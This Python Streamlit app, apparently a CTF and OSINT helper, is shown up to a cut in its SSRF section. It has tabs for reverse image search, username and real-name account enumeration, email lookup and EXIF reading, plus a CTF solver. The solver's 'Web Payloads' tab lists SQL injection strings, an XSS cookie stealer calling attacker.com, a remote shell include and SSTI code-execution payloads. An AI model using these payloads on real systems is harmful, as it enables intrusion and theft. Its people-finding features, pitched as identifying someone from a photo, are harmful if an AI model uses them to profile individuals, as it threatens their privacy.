#!/usr/bin/env python3
"""OSINT Suite — Run: streamlit run osint_suite.py"""

import sys, os, io, re, math, time, socket, types, base64
import hashlib, urllib.parse, string, random
from collections import Counter
from datetime import datetime

import requests
import streamlit as st
from PIL import Image, ExifTags

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

if "pkg_resources" not in sys.modules:
    import types as _t
    _m = _t.ModuleType("pkg_resources")
    _m.resource_filename = lambda p, r: os.path.join("/tmp", r)
    sys.modules["pkg_resources"] = _m

st.set_page_config(page_title="OSINT Suite", page_icon="🕵️", layout="wide", initial_sidebar_state="collapsed")

st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}
.stApp{background:#020810;background-image:radial-gradient(ellipse 90% 55% at 15% 8%,rgba(0,180,255,.08) 0%,transparent 55%),radial-gradient(ellipse 70% 70% at 85% 90%,rgba(120,0,255,.07) 0%,transparent 55%),repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,255,.008) 3px,rgba(0,255,255,.008) 4px);min-height:100vh}
body,.stApp,p,span,div,label{font-family:'Space Grotesk',sans-serif!important;color:#c0d8ee}
h1,h2,h3,h4{font-family:'Share Tech Mono',monospace!important}
.glass{background:linear-gradient(140deg,rgba(255,255,255,.065),rgba(255,255,255,.018));backdrop-filter:blur(22px) saturate(160%);border-radius:22px;border:1px solid rgba(255,255,255,.1);box-shadow:0 8px 36px rgba(0,0,0,.45),inset 0 1px 0 rgba(255,255,255,.07);padding:1.3rem 1.5rem;margin:.6rem 0}
.tip{background:rgba(0,255,160,.05);border-left:3px solid #00ffaa;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0 .9rem;font-size:.875rem;color:#8ae8c4}
.warn{background:rgba(255,170,0,.06);border-left:3px solid #ffaa00;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;font-size:.875rem;color:#ffd070}
.danger{background:rgba(255,50,50,.07);border-left:3px solid #ff4444;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;color:#ff9090}
.success-box{background:rgba(0,255,120,.07);border-left:3px solid #00ff88;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;color:#80ffbb}
.rcard{background:rgba(0,195,255,.055);border:1px solid rgba(0,195,255,.14);border-radius:14px;padding:.7rem 1rem;margin:.35rem 0}
.rcard a{color:#00e0ff;text-decoration:none}
.badge-found{display:inline-block;background:rgba(0,255,130,.15);border:1px solid rgba(0,255,130,.5);border-radius:20px;padding:1px 9px;font-size:.72rem;color:#00ff88;margin-left:6px}
.stat-row{display:flex;gap:10px;flex-wrap:wrap;margin:.7rem 0}
.stat-pill{background:rgba(0,195,255,.07);border:1px solid rgba(0,195,255,.18);border-radius:40px;padding:4px 13px;font-size:.8rem;color:#6dd8f8}
.sec-title{font-family:'Share Tech Mono',monospace;font-size:1.1rem;font-weight:700;color:#d8f0ff;margin:1rem 0 .6rem;display:flex;align-items:center;gap:8px}
.sec-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,195,255,.25),transparent);margin-left:8px}
.stButton>button{background:linear-gradient(135deg,#00c0ff,#004ecc)!important;border:none!important;border-radius:50px!important;padding:.52rem 1.4rem!important;font-weight:600!important;color:#fff!important;box-shadow:0 4px 16px rgba(0,110,255,.38)!important;transition:all .2s!important}
.stButton>button:hover{transform:translateY(-2px)!important;box-shadow:0 8px 26px rgba(0,110,255,.6)!important}
.stTextInput input,.stTextArea textarea{background:rgba(8,18,32,.78)!important;border:1px solid rgba(0,195,255,.18)!important;border-radius:50px!important;color:#e2f2ff!important;font-family:'Share Tech Mono',monospace!important;font-size:.93rem!important;padding:.6rem 1.1rem!important}
.stTextArea textarea{border-radius:16px!important}
.stTabs [data-baseweb="tab-list"]{display:flex!important;justify-content:center!important;flex-wrap:wrap!important;background:rgba(4,12,24,.82)!important;backdrop-filter:blur(18px)!important;border-radius:60px!important;padding:6px 12px!important;gap:4px!important;border:1px solid rgba(0,195,255,.14)!important;margin:0 auto!important;width:fit-content!important}
.stTabs [data-baseweb="tab"]{font-family:'Space Grotesk',sans-serif!important;font-weight:500!important;font-size:.75rem!important;color:#607a92!important;padding:.4rem 1rem!important;border-radius:40px!important;white-space:nowrap!important}
.stTabs [aria-selected="true"]{background:linear-gradient(135deg,#00c0ff,#0050cc)!important;color:#fff!important;box-shadow:0 0 20px rgba(0,192,255,.45)!important}
pre,code{font-family:'Share Tech Mono',monospace!important;font-size:.83rem!important}
.stProgress>div>div>div{background:linear-gradient(90deg,#00c0ff,#00ff88)!important;border-radius:10px!important}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:rgba(0,0,0,.25)}::-webkit-scrollbar-thumb{background:rgba(0,195,255,.28);border-radius:3px}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
.ldot{display:inline-block;width:7px;height:7px;background:#00ff88;border-radius:50%;animation:blink 1.8s infinite;margin-right:5px;vertical-align:middle}
</style>
""", unsafe_allow_html=True)

st.markdown("""
<div style="text-align:center;padding:1.5rem 0 .4rem">
  <div style="font-size:2.8rem;margin-bottom:.25rem">🕵️</div>
  <div style="font-family:'Share Tech Mono',monospace;font-size:2rem;font-weight:800;background:linear-gradient(135deg,#fff,#00ddff 55%,#9b72ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent">OSINT Suite</div>
  <div style="color:#3d6070;font-size:.75rem;margin-top:.45rem"><span class='ldot'></span>live lookups · nothing stored · free to use</div>
</div>
""", unsafe_allow_html=True)

with st.sidebar:
    st.markdown("### 🕵️ OSINT Suite")
    st.markdown("""
Tools inside:
- 🔍 Reverse Image
- 👤 Username & Social Media
- 📧 Email Lookup
- 📁 File Metadata
- 🎯 CTF Solver
- 🔬 Deep File Scan
- 🌐 Network Recon
- 🔐 Password Tools
    """)
    st.caption("Everything runs in your browser. No accounts, no tracking.")

tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
    "🔍 Image", "👤 Social Media", "📧 Email", "📁 Metadata",
    "🎯 CTF", "🔬 Deep Scan", "🌐 Network", "🔐 Passwords"
])

def sec(txt): st.markdown(f"<div class='sec-title'>{txt}</div>", unsafe_allow_html=True)
def tip(msg): st.markdown(f"<div class='tip'>💡 {msg}</div>", unsafe_allow_html=True)
def warn(msg): st.markdown(f"<div class='warn'>⚠️ {msg}</div>", unsafe_allow_html=True)
def danger(msg): st.markdown(f"<div class='danger'>🚨 {msg}</div>", unsafe_allow_html=True)
def ok(msg): st.markdown(f"<div class='success-box'>✅ {msg}</div>", unsafe_allow_html=True)
def rcard(html): st.markdown(f"<div class='rcard'>{html}</div>", unsafe_allow_html=True)
def glass(html): st.markdown(f"<div class='glass'>{html}</div>", unsafe_allow_html=True)
def pills(pairs):
    inner = "".join(f"<span class='stat-pill'>{k}: <b>{v}</b></span>" for k, v in pairs)
    st.markdown(f"<div class='stat-row'>{inner}</div>", unsafe_allow_html=True)


# ── TAB 1: REVERSE IMAGE ────────────────────────────────────────────────
with tab1:
    sec("Reverse Image Search")
    st.markdown("""
**What is this?** Upload a photo and we'll host it for you, then you can run it through Google, Yandex, Bing, and TinEye with one click.

**When is this useful?**
- You want to find out who someone is from a photo
- You want to check if a photo has been used elsewhere online
- You found an image and want to trace where it originally came from
""")
    tip("Best results: use a clear, unedited photo. Cropped headshots work better than group photos for face searches.")

    img_file = st.file_uploader("Pick an image to search", type=["jpg","png","jpeg","webp","gif"], key="rev_img")
    if img_file:
        img_bytes = img_file.getvalue()
        c1, c2 = st.columns([1, 2])
        with c1:
            st.image(img_bytes, width=210, caption=img_file.name)
        with c2:
            pills([("File", img_file.name), ("Size", f"{max(1,len(img_bytes)//1024)} KB")])
            with st.spinner("Uploading image..."):
                try:
                    r = requests.post("https://tmpfiles.org/api/v1/upload",
                                      files={"file": (img_file.name, img_bytes)}, timeout=20)
                    if r.status_code == 200:
                        raw_url = r.json()["data"]["url"]
                        direct = raw_url.replace("tmpfiles.org/", "tmpfiles.org/dl/")
                        enc = urllib.parse.quote_plus(direct)
                        ok("Image uploaded. Click a search engine below:")
                        engines = {
                            "Google Lens": f"https://lens.google.com/uploadbyurl?url={enc}",
                            "Yandex": f"https://yandex.com/images/search?rpt=imageview&url={enc}",
                            "Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}",
                            "TinEye": f"https://tineye.com/search?url={enc}",
                        }
                        cols = st.columns(2)
                        for i, (name, url) in enumerate(engines.items()):
                            with cols[i % 2]:
                                st.link_button(name, url, use_container_width=True)
                        st.caption(f"Direct link (valid ~60 min): {direct}")
                    else:
                        danger("Upload failed. Try a smaller JPEG.")
                except Exception as e:
                    danger(f"Upload error: {e}")


# ── TAB 2: SOCIAL MEDIA / USERNAME ─────────────────────────────────────
with tab2:
    sec("Social Media & Username Search")
    st.markdown("""
**What does this do?** You give it a username or a real name, and it checks 20+ platforms to see if that account exists — TikTok, Instagram, Twitter/X, GitHub, YouTube, LinkedIn, and more.

**How to use it:**
1. Type the username (like `charlidamelio`) OR a real name (like `Charlie D'Amelio`)
2. Pick whether it's a username or a full name
3. Hit **Search All Platforms** — it checks every site and shows what it finds
4. If nothing comes back, scroll down for **manual links** to open each site yourself

**What's a "username"?** The @handle someone uses online — like @nasa on Instagram, or nasa on GitHub.
""")
    tip("Some platforms (especially TikTok and Instagram) block automated checks. Use the manual links at the bottom if automated search returns nothing.")

    col_q, col_m = st.columns([3, 1])
    with col_q:
        u_query = st.text_input("Username or full name", placeholder="johndoe  or  John Doe", key="u_query")
    with col_m:
        u_mode = st.radio("Type", ["Username", "Full name"], key="u_mode")

    PLATFORMS = {
        "TikTok": "https://tiktok.com/@{}",
        "Instagram": "https://instagram.com/{}",
        "Twitter/X": "https://twitter.com/{}",
        "Facebook": "https://facebook.com/{}",
        "GitHub": "https://github.com/{}",
        "Reddit": "https://reddit.com/user/{}",
        "YouTube": "https://youtube.com/@{}",
        "Twitch": "https://twitch.tv/{}",
        "Snapchat": "https://snapchat.com/add/{}",
        "Telegram": "https://t.me/{}",
        "Pinterest": "https://pinterest.com/{}",
        "LinkedIn": "https://linkedin.com/in/{}",
        "Threads": "https://threads.net/@{}",
        "Medium": "https://medium.com/@{}",
        "SoundCloud": "https://soundcloud.com/{}",
        "Flickr": "https://flickr.com/people/{}",
        "Tumblr": "https://tumblr.com/{}",
        "DeviantArt": "https://deviantart.com/{}",
        "Spotify": "https://open.spotify.com/user/{}",
        "Steam": "https://steamcommunity.com/id/{}",
    }

    if st.button("🔍 Search All Platforms", use_container_width=True, key="hunt_go") and u_query:
        q = u_query.strip()
        cands = set()
        if u_mode == "Username":
            cands.add(q.lower().lstrip('@'))
        else:
            parts = q.lower().split()
            first = parts[0] if parts else q.lower()
            last = parts[-1] if len(parts) > 1 else ""
            cands.update([q.lower().replace(" ", ""), q.lower().replace(" ", "."), q.lower().replace(" ", "_")])
            if last:
                cands.update([f"{first}{last}", f"{first}.{last}", f"{first}_{last}",
                               f"{first[0]}{last}", f"{last}{first}", f"{first}{last}1",
                               f"its{first}", f"real{first}"])
        cands = list(cands)[:15]

        found_list = []
        pb = st.progress(0.0)
        stat = st.empty()
        total = len(cands) * len(PLATFORMS)
        done = 0

        for uname in cands:
            stat.markdown(f"<span class='ldot'></span>Checking **@{uname}**...", unsafe_allow_html=True)
            for plat, tmpl in PLATFORMS.items():
                url = tmpl.format(uname)
                try:
                    resp = requests.get(url, timeout=4,
                                        headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
                    if resp.status_code == 200:
                        body = resp.text.lower()
                        if not any(x in body for x in [
                            "not found","doesn't exist","page not found",
                            "user not found","couldn't find this account","sorry, this page"
                        ]):
                            found_list.append({"platform": plat, "username": uname, "url": url})
                except:
                    pass
                done += 1
                pb.progress(min(done / total, 0.99))

        pb.empty(); stat.empty()

        if found_list:
            st.success(f"Found {len(found_list)} profile(s)")
            for r in found_list:
                rcard(f"<b>{r['platform']}</b> <span class='badge-found'>FOUND</span><br>"
                      f"@{r['username']}<br><a href='{r['url']}' target='_blank'>{r['url']}</a>")
        else:
            warn("Nothing found automatically. Try the manual links below — some platforms block bots.")

        with st.expander("🔗 Open links manually (click to expand)"):
            tip("If the search above came up empty, open these yourself. Some platforms only show results when you visit directly.")
            for uname in list(cands)[:4]:
                st.markdown(f"**Checking: @{uname}**")
                mc = st.columns(5)
                quick = [("TikTok", f"https://tiktok.com/@{uname}"),
                         ("Instagram", f"https://instagram.com/{uname}"),
                         ("Twitter", f"https://twitter.com/{uname}"),
                         ("GitHub", f"https://github.com/{uname}"),
                         ("LinkedIn", f"https://linkedin.com/in/{uname}")]
                for i, (pn, pu) in enumerate(quick):
                    with mc[i]:
                        st.link_button(pn, pu, use_container_width=True)

    # ── TIKTOK FINDER ────────────────────────────────────────────────────
    st.markdown("---")
    sec("🎵 TikTok Finder")
    st.markdown("""
**TikTok-specific deep search.** Enter a real name or username and we'll generate every common TikTok handle variation and open them for you.

**Why a separate TikTok section?** TikTok blocks most automated checks, so we generate all likely username variations and let you click directly.

**How to use:**
1. Type the name or username below
2. Click **Find on TikTok** — it generates variants like `firstname`, `firstnamelast`, `itsfirstname`, etc.
3. Click any link to open that profile directly on TikTok
4. Use the **Search & Google** buttons to do a broader search
""")
    tip("TikTok usernames often drop spaces and sometimes add 'real', 'its', 'official', or numbers. We generate all of those.")

    tt_query = st.text_input("Name or username to find on TikTok:", placeholder="Charlie D'Amelio  or  charlidamelio", key="tt_q")
    if st.button("🎵 Find on TikTok", use_container_width=True, key="tt_go") and tt_query:
        raw = tt_query.strip().lstrip('@').lower()
        parts = raw.split()
        f = parts[0] if parts else raw
        l = parts[-1] if len(parts) > 1 else ""
        tt_variants = list(dict.fromkeys(filter(None, [
            raw.replace(" ", ""),
            raw.replace(" ", "."),
            raw.replace(" ", "_"),
            f"{f}{l}" if l else "",
            f"{f}.{l}" if l else "",
            f"{f}_{l}" if l else "",
            f"{f[0]}{l}" if l else "",
            f"its{f}",
            f"real{f}",
            f"{f}official",
            f"its{f}{l}" if l else "",
            f"real{f}{l}" if l else "",
            f"{f}{l}official" if l else "",
            f"{f}{l}1" if l else "",
            f"{f}{l}2" if l else "",
        ])))

        st.markdown(f"**Generated {len(tt_variants)} TikTok variants — click any to open:**")
        cols = st.columns(3)
        for i, v in enumerate(tt_variants):
            with cols[i % 3]:
                st.link_button(f"@{v}", f"https://tiktok.com/@{v}", use_container_width=True)

        st.markdown("**Broader search:**")
        bc1, bc2 = st.columns(2)
        bc1.link_button("TikTok Search", f"https://tiktok.com/search/user?q={urllib.parse.quote(tt_query)}", use_container_width=True)
        bc2.link_button("Google: site:tiktok.com", f"https://google.com/search?q=site:tiktok.com+{urllib.parse.quote(tt_query)}", use_container_width=True)


# ── TAB 3: EMAIL ────────────────────────────────────────────────────────
with tab3:
    sec("Email Lookup")
    st.markdown("""
**What does this do?** Enter an email address and we'll:
- Check if there's a Gravatar (profile picture) linked to it
- Look up its reputation — is it legit or is it tied to spam?
- Give you a direct link to check if it appeared in any data breaches

**What's a data breach?** When a website gets hacked and user passwords/emails get leaked online.
HaveIBeenPwned keeps a database of those leaks so you can check if an email was exposed.
""")
    tip("This works best with personal or business emails. Disposable email services (like guerrillamail) usually have low reputation scores.")

    email_in = st.text_input("Email address", placeholder="someone@example.com", key="email_in")
    if st.button("Look Up", use_container_width=True, key="email_go") and email_in:
        em = email_in.strip().lower()
        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", em):
            danger("That doesn't look like a valid email. Try: name@domain.com")
        else:
            local, domain = em.split("@", 1)
            md5h = hashlib.md5(em.encode()).hexdigest()
            glass(f"<b>Email:</b> {em}<br><b>Domain:</b> {domain}<br><b>MD5:</b> <code>{md5h}</code>")

            sec("Profile Picture (Gravatar)")
            try:
                grav = requests.get(f"https://www.gravatar.com/avatar/{md5h}?d=404&s=120", timeout=7)
                if grav.status_code == 200:
                    st.image(f"https://www.gravatar.com/avatar/{md5h}?s=100", width=100)
                    ok("There's a Gravatar profile linked to this email.")
                else:
                    st.info("No Gravatar found for this address.")
            except:
                st.info("Couldn't reach Gravatar right now.")

            sec("Data Breach Check")
            st.markdown("Click below to check HaveIBeenPwned — it's free and shows which breaches this email appeared in.")
            st.link_button("Check HaveIBeenPwned →", f"https://haveibeenpwned.com/account/{urllib.parse.quote(em)}", use_container_width=True)

            sec("Reputation Score")
            try:
                erep = requests.get(f"https://emailrep.io/{urllib.parse.quote(em)}",
                                    headers={"User-Agent": "osint-suite/1.0"}, timeout=8)
                if erep.status_code == 200:
                    d = erep.json()
                    rep = d.get("reputation", "unknown")
                    sus = d.get("suspicious", False)
                    label = {"high": "🟢 Trusted", "medium": "🟡 Moderate", "low": "🔴 Suspicious"}.get(rep, "⚪ Unknown")
                    st.markdown(f"**Reputation:** {label}")
                    if sus:
                        warn("This address is flagged as suspicious by emailrep.io")
                    else:
                        ok("Not flagged as suspicious.")
                else:
                    st.info("EmailRep rate limited — try again in a minute.")
            except:
                pass


# ── TAB 4: METADATA ─────────────────────────────────────────────────────
with tab4:
    sec("File Metadata & EXIF")
    st.markdown("""
**What is EXIF data?** Every photo taken on a phone or camera stores hidden information inside the file — things like:
- What camera or phone took the photo
- The exact GPS coordinates of where it was taken
- The date and time it was taken
- Software used to edit it

**Why does this matter?** Criminals have been caught because they forgot to strip GPS data before posting photos online.
Most social media (Instagram, Twitter) automatically removes this data, but photos shared directly often still have it.
""")
    tip("Try uploading a photo taken on your phone — you might be surprised what's stored in it.")

    meta_file = st.file_uploader("Upload an image", type=["jpg","jpeg","png","tiff","webp"], key="meta_f")
    if meta_file:
        try:
            img = Image.open(io.BytesIO(meta_file.getvalue()))
            st.image(img, width=250)
            pills([("Format", img.format or "?"), ("Size", f"{img.size[0]}×{img.size[1]}"), ("Mode", img.mode)])
            exif = img._getexif()
            if exif:
                human = {ExifTags.TAGS.get(k, str(k)): str(v)[:200] for k, v in exif.items()}
                if any("GPS" in k for k in human):
                    danger("GPS coordinates found in this photo! It contains location data.")
                else:
                    ok("No GPS data found.")
                with st.expander("📷 All EXIF fields (click to expand)"):
                    st.json(human)
            else:
                st.info("No EXIF data found — this image has been cleaned or was never tagged.")
        except Exception as e:
            danger(f"Couldn't read this file: {e}")


# ── TAB 5: CTF SOLVER ──────────────────────────────────────────────────
with tab5:
    sec("CTF Solver")

    with st.expander("🆕 New to CTFs? Read this first — it explains everything", expanded=False):
        st.markdown("""
## What is a CTF?

**CTF = Capture The Flag.** It's a hacking competition where you solve puzzles to find a hidden secret called a "flag."
Flags usually look like: `CTF{s0me_secret_here}` or `flag{this_is_the_answer}`.

You don't need to know how to hack to start. Most beginner challenges are just about recognizing patterns and using the right decoder.

---

## Step 1 — Figure out what type of challenge it is

| What you're given | Challenge type | Go to |
|-------------------|---------------|-------|
| A weird-looking text string | **Encoding/Cipher** | 🔤 Multi-Decoder |
| A long string of letters/numbers (like `5f4dcc3b...`) | **Hash** | #️⃣ Hash Identifier |
| An image file with a hidden message | **Steganography** | 🖼️ Steganography |
| A website with a login form or weird URL | **Web** | 💉 Web Payloads |
| A `.pcap` file (network traffic) or disk image | **Forensics** | 🔬 Forensics & PCAP |
| Dots and dashes like `... --- ...` | **Morse code** | 🔤 Multi-Decoder → Morse |
| `-----BEGIN ...-----` block | **JWT / Base64** | 🔤 Multi-Decoder |

---

## Step 2 — Recognize common encodings

These are the most common things you'll see in beginner CTFs:

**Base64** — ends with `=` or `==`, uses letters + numbers + `+/`
> Example: `aGVsbG8gd29ybGQ=` → decodes to `hello world`

**Hex** — only has characters `0-9` and `a-f`, usually in pairs
> Example: `68656c6c6f` → decodes to `hello`

**Binary** — only 0s and 1s, grouped in 8s
> Example: `01101000 01101001` → decodes to `hi`

**ROT13 / Caesar** — looks like English but the letters are wrong
> Example: `Uryyb Jbeyq` → ROT13 → `Hello World`

**Morse code** — dots, dashes, and spaces
> Example: `.... . .-.. .-.. ---` → `HELLO`

---

## Step 3 — When you're stuck

1. **Paste your text into Multi-Decoder → hit "Try Everything"** — it runs all decoders at once
2. **Look at the length** — 32 chars = MD5 hash, 64 chars = SHA256
3. **Google the exact string** — sometimes flags are in CTF writeups
4. **Check the file** — run `strings file.bin | grep -i flag` to look for hidden text

---

## Good free resources for beginners

- [PicoCTF](https://picoctf.org) — best beginner CTF platform, free, permanent
- [Hack The Box](https://hackthebox.com) — more advanced, great labs
- [CyberChef](https://gchq.github.io/CyberChef/) — drag-and-drop decoder for everything
- [dCode.fr](https://dcode.fr/en) — identifies and decodes almost any cipher
        """)

    tool = st.selectbox("Pick a tool:", [
        "🔤 Multi-Decoder",
        "#️⃣ Hash Identifier & Cracker",
        "🔄 Caesar / ROT Brute Force",
        "🖼️ Steganography",
        "💉 Web Payloads",
        "🔬 Forensics & PCAP",
        "🔢 Number Base Converter",
        "🔐 XOR Decoder",
        "📡 Morse Code Decoder",
        "🔑 JWT Decoder",
        "🌐 URL Encoder / Decoder",
        "📦 Base32 Decoder",
    ], key="ctf_tool")

    # ── MULTI DECODER ──────────────────────────────────────────────────
    if tool == "🔤 Multi-Decoder":
        st.markdown("""
**Paste any encoded text and click a button to decode it.**

**Not sure what it is?** Hit **Try Everything** — it runs all decoders and shows whatever produces readable text.

**Quick identification guide:**
- Ends with `=` or `==` and has mixed letters/numbers → **Base64**
- Only letters, looks like scrambled English → probably **ROT13**
- Only `0-9` and `a-f` characters → probably **Hex**
- Only `0`s and `1`s → **Binary**
- Dots, dashes, spaces → **Morse Code** (use the Morse decoder tool)
- `%20`, `%3D`, `+` signs in URLs → **URL encoded**
        """)
        cipher = st.text_area("Paste your encoded text:", height=100,
                               placeholder="dGhpcyBpcyBhIHRlc3Q=   or   Uryyb Jbeyq   or   48656c6c6f", key="ctf_cipher")

        c1, c2, c3, c4, c5, c6 = st.columns(6)

        def b64_decode(s):
            s = s.strip()
            pad = s + "=" * ((4 - len(s) % 4) % 4)
            return base64.b64decode(pad).decode("utf-8", errors="replace")

        def hex_decode(s):
            c = re.sub(r'[^0-9a-fA-F]', '', s)
            if len(c) % 2 != 0:
                c = c[:-1]
            return bytes.fromhex(c).decode("utf-8", errors="replace")

        def bin_decode(s):
            bits = re.sub(r'[^01]', '', s)
            if len(bits) % 8 != 0:
                bits = bits[:-(len(bits) % 8)]
            if not bits:
                raise ValueError("empty")
            return "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))

        def rot13(s):
            return s.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))

        with c1:
            if st.button("Try Everything", use_container_width=True) and cipher:
                found_any = False
                for label, fn in [("Base64", b64_decode), ("Hex", hex_decode),
                                   ("Binary", bin_decode), ("ROT13", rot13)]:
                    try:
                        r = fn(cipher)
                        if r and any(c.isprintable() for c in r):
                            ok(f"**{label}** → {r}")
                            found_any = True
                    except: pass
                try:
                    ok(f"**URL decode** → {urllib.parse.unquote(cipher.strip())}")
                    found_any = True
                except: pass
                if not found_any:
                    warn("Nothing decoded cleanly. Try a specific decoder or check if the text is correct.")

        with c2:
            if st.button("Base64", use_container_width=True) and cipher:
                try: ok(b64_decode(cipher))
                except: danger("Not valid Base64. Check the text and try again.")

        with c3:
            if st.button("ROT13", use_container_width=True) and cipher:
                ok(rot13(cipher))

        with c4:
            if st.button("Hex", use_container_width=True) and cipher:
                try: ok(hex_decode(cipher))
                except: danger("Not valid hex. Should only contain 0-9 and a-f.")

        with c5:
            if st.button("Binary", use_container_width=True) and cipher:
                try: ok(bin_decode(cipher))
                except Exception as e: danger(f"Not valid binary: {e}")

        with c6:
            if st.button("URL Decode", use_container_width=True) and cipher:
                ok(urllib.parse.unquote(cipher.strip()))

        # Base64 encode too
        st.markdown("---")
        st.markdown("**Need to encode something?**")
        enc_in = st.text_input("Text to Base64-encode:", key="b64_enc")
        if enc_in:
            ok(f"Base64: `{base64.b64encode(enc_in.encode()).decode()}`")

    # ── CAESAR / ROT BRUTE FORCE ────────────────────────────────────────
    elif tool == "🔄 Caesar / ROT Brute Force":
        st.markdown("""
**Caesar cipher** shifts each letter by a fixed number. ROT13 is just Caesar with a shift of 13.

If you have encoded text and aren't sure what shift was used, paste it here and we'll show you all 25 possibilities at once.
The correct one will be the only one that reads as English (or whatever language the flag is in).
        """)
        caesar_in = st.text_area("Paste encoded text:", height=80, key="caesar_in")
        if caesar_in:
            st.markdown("**All 25 shifts — find the one that makes sense:**")
            for shift in range(1, 26):
                result = ""
                for ch in caesar_in:
                    if ch.isalpha():
                        base = ord('A') if ch.isupper() else ord('a')
                        result += chr((ord(ch) - base + shift) % 26 + base)
                    else:
                        result += ch
                st.text(f"ROT{shift:2d}: {result[:120]}")

    # ── HASH IDENTIFIER ────────────────────────────────────────────────
    elif tool == "#️⃣ Hash Identifier & Cracker":
        st.markdown("""
**A hash is a one-way fingerprint of data.** You can't reverse it, but you can look it up in a database of known hashes.

**How to identify your hash:**
- 32 characters → MD5
- 40 characters → SHA-1
- 64 characters → SHA-256
- 128 characters → SHA-512
- Starts with `$2y$` or `$2b$` → bcrypt

After identifying it, paste it into CrackStation (free) to see if the original password is known.
        """)
        hash_in = st.text_input("Paste the hash:", placeholder="5f4dcc3b5aa765d61d8327deb882cf99", key="h_in")
        if st.button("Identify", use_container_width=True) and hash_in:
            h = hash_in.strip()
            L = len(h)
            hex_pat = re.fullmatch(r'[a-fA-F0-9]+', h)
            if L == 32 and hex_pat:
                ok("**MD5** — 32 hex characters")
                st.code("hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif L == 40 and hex_pat:
                ok("**SHA-1** — 40 hex characters")
                st.code("hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif L == 64 and hex_pat:
                ok("**SHA-256** — 64 hex characters")
                st.code("hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif L == 128 and hex_pat:
                ok("**SHA-512** — 128 hex characters")
                st.code("hashcat -m 1700 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            elif re.match(r'^\$2[aby]\$', h):
                ok("**bcrypt** — very slow to crack")
                st.code("hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", language="bash")
            else:
                warn(f"Unknown hash type (length: {L}). Check hash-identifier or try manually.")
            st.link_button("Try CrackStation (free, huge database)", "https://crackstation.net/", use_container_width=True)

    # ── STEGANOGRAPHY ───────────────────────────────────────────────────
    elif tool == "🖼️ Steganography":
        st.markdown("""
**Steganography = hiding data inside files.** In CTFs this almost always means a secret message hidden inside an image.

**Where to start:**
1. Upload the image here to preview it
2. Try [Aperisolve](https://aperisolve.com) first — it's the easiest online tool and runs everything automatically
3. If that doesn't work, use the terminal commands below (on Kali Linux or any Linux system)

**Signs that an image might have hidden data:**
- The file size is suspiciously large for its dimensions
- There's a password hint somewhere in the challenge
- The image looks slightly off or has weird colors
        """)
        steg_f = st.file_uploader("Upload the image (optional preview)", type=["jpg","png","bmp","gif","tiff"], key="steg_f")
        if steg_f:
            st.image(io.BytesIO(steg_f.getvalue()), width=300)

        st.link_button("🌐 Try Aperisolve first (easiest, free, online)", "https://aperisolve.com", use_container_width=True)
        st.markdown("**Or run these in your terminal (Kali Linux):**")
        st.code("""# Step 1 — check the real file type (don't trust the extension)
file image.png

# Step 2 — look for readable text with "flag" in it
strings image.png | grep -iE 'flag|ctf|key|secret'

# Step 3 — check for embedded files inside the image
binwalk -e image.png

# Step 4 — try steghide (works on JPGs, needs a password — try empty "")
steghide extract -sf image.jpg -p ""

# Step 5 — zsteg for PNG hidden data
zsteg -a image.png

# Step 6 — check EXIF metadata
exiftool image.png""", language="bash")

    # ── WEB PAYLOADS ────────────────────────────────────────────────────
    elif tool == "💉 Web Payloads":
        st.markdown("""
**These are common attack payloads used in web CTF challenges.**
Only use these on systems you own or have permission to test.

Pick a category to see ready-to-use payloads you can copy and try.
        """)
        warn("For authorized testing and CTF challenges only.")
        wcat = st.radio("Category:", ["SQL Injection", "XSS", "LFI/RFI", "SSTI", "SSRF", "XXE"], horizontal=True, key="wcat")
        payloads = {
            "SQL Injection": """-- Basic login bypass
' OR '1'='1' --
admin'--

-- Find number of columns (keep going until error)
' ORDER BY 1--
' ORDER BY 2--

-- Extract data (MySQL)
' UNION SELECT NULL,username,password FROM users--

-- Blind: check if vulnerable
' AND 1=1--   (true, page loads normally)
' AND 1=2--   (false, page changes)

-- Time-based blind
' AND SLEEP(5)--""",
            "XSS": """<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie stealer -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

<!-- Filter bypasses -->
<ScRiPt>alert(1)</ScRiPt>
javascript:alert(1)""",
            "LFI/RFI": """../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd

# Read PHP source via filter
php://filter/convert.base64-encode/resource=index.php

# Remote include (if enabled)
?page=http://attacker.com/shell.txt""",
            "SSTI": """# Test: does the server evaluate math?
{{7*7}}   → should show 49 if vulnerable

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}""",
            "SSRF": """# Internal admin panels
http://127.0.0.1:8080/admin
http://localhost:22

# AWS metadata endpoint
